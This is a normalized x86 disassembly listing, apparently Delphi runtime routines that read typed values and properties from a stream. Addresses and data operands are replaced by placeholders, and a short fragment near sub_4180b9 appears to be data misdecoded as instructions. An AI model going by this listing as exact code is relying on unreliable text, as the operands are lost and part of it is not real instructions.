mov eax [ ebp - 0x4 ]
call sub_417364
retn
sub_417cd0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417108
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4181d8
mov eax [ ebp - 0x4 ]
call sub_418074
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_40349c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_417d92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_40349c
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417108
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_417a24
mov eax [ ebp - 0x4 ]
call sub_418074
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417d99
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_417da0
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_418eac
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_418028
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_417470
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_417de4
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_418eac
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_418028
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_417470
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_417e28
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418eac
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_418028
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417470
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_417e78
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418eac
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_418028
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417470
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_417ebc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_418eac
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_416f48
mov al [ eax + lookup_table_417ee3 ]
jmp [ eax * 4 + jump_table_417ef1 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_417470
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404164
mov eax esi
call j_sub_404540#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_417470
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040c8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040c8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040c8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4040c8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_417fbc
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_418eac
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_417470
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_417470
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_417470
jmp r-xdata
jmp r-xdata
call sub_416f48
sub_418028
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41744c
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_417fbc
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_418eac
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417470
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41807c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41744c
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_418eac
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_417fbc
mov [ edi ] eax
sub_4180b9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4181ad
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404074
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_40410c
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181b4
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031f0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042d8
sub_4181d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4183a8
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_40386c#6
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418cd0
xor edx edx
push ebp
push j_sub_40386c#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404334
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404594
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034e0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410acc
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034e0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410acc
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41855c
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41745c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41745c
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_410b3c
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_4181bc
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183af
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov edi ebx
jmp r-xdata
sub_4183b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_4137d8
mov ebx eax
test ebx ebx
je r-xdata
call sub_416f48
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_410bb0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418400
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4169dc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413c88
pop edi
pop esi
pop ebx
pop ebp
retn
sub_418440
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41848f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4195c4
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41104c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418496
lea eax [ ebp - 0x10 ]
call sub_40ebd8
retn
sub_41849c
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41854e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41744c
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417ebc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4169dc
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413c88
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418eac
lea eax [ ebp - 0x4 ]
call sub_4056e0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_411100
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418555
lea eax [ ebp - 0x8 ]
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_4056e0
retn
sub_41855c
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418857
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41885e
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x24 ]
call sub_404754
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404098
retn
jmp [ eax * 4 + jump_table_4185ec ]
mov eax [ rw-data ]
call sub_416f30
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b3c
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41744c
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41750c
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410bb0
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_417ebc
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_410a68
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410bb0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417da0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410e40
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418d0c
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d40
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418dc8
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410d6c
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418bf0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410bb0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41744c
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41744c
cmp al 0xd
jne r-xdata
push ebp
call sub_418440
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418028
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4110c4
jmp r-xdata
push ebp
call sub_41849c
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b3c
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417fbc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410bb0
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_417ebc
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4183b8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418eac
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410bb0
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_417ebc
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418eac
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41108c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418eac
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b3c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_417564
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41108c
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_417ebc
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418400
pop ecx
jmp r-xdata
sub_418864
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_4040c8
jmp r-xdata
mov eax [ ebx ]
call sub_413970
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408dbc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4188c4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418bdf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418cac
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418bbd
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418b7e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418cd0
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_418cd0
mov eax [ ebp - 0x1c ]
call sub_413544
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418cd0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_418cd0
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_418864
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_418cd0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4031e8
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413294
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_418b23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405e10
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413c88
xor eax eax
push ebp
push sub_418b03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413e40
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b0a
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4032a0
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_413de4
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_418b54
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403aa8
jmp r-xdata
call sub_403a54
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_416c58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418bc4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418b83
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_416e00
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a54
call sub_403aa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418bc4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_4032a0
sub_418bf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418c9a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418c6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418eac
cmp al 0xb
je r-xdata
mov eax ebx
call sub_410a10
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_416f48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416f80
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418ca1
lea eax [ ebp - 0x8 ]
call sub_404074
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418cd0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_418cd0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_417470
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404164
mov eax esi
call j_sub_404540#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_417470
pop edx
pop esi
pop ebx
retn
sub_418d0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418db9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41744c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_418dc8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4042fc
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418dc0
lea eax [ ebp - 0x8 ]
call sub_404754
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418eac
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_417470
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4046c0
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_417470
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417470
jmp r-xdata
jmp r-xdata
call sub_416f48
sub_418dc8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418e9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41744c
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418d0c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4048a0
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418ea6
lea eax [ ebp - 0xc ]
call sub_404074
lea eax [ ebp - 0x8 ]
call sub_404074
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418eac
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417470
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40499c
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_417470
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_417470
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4046c0
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_417470
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405ab0
jmp r-xdata
jmp r-xdata
call sub_416f48
